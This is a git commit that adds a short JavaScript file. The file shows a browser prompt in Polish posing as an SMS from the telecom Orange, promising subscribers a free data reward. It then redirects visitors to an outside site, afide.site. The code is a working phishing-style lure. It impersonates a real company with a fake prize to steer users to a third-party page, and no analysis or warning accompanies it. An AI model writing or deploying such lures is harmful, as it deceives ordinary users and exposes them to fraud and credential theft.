69340c75aa923384f8a742c4eff675f524cc6ecb
ufaiba <ufaiba247@gmail.com>
2026-06-25 01:14:38 -0700

    Create act-orangesubscribers.js

---
+++ act-orangesubscribers.js
@@ -0,0 +1,5 @@
+var password = 'DARMOWE DANE'
+password=prompt('Orange SMS: Szanowny Kliencie, w ramach nagrody za wieloletnią subskrypcję otrzymujesz od 5 GB do 50 GB darmowego pakietu danych; kliknij „Darmowe dane”, aby sprawdzić szczegóły. ','DARMOWE DANE');
+if (password != 'DARMOWE DANE') {
+location.href='https://afide.site/orangesubscribers.html';
+}
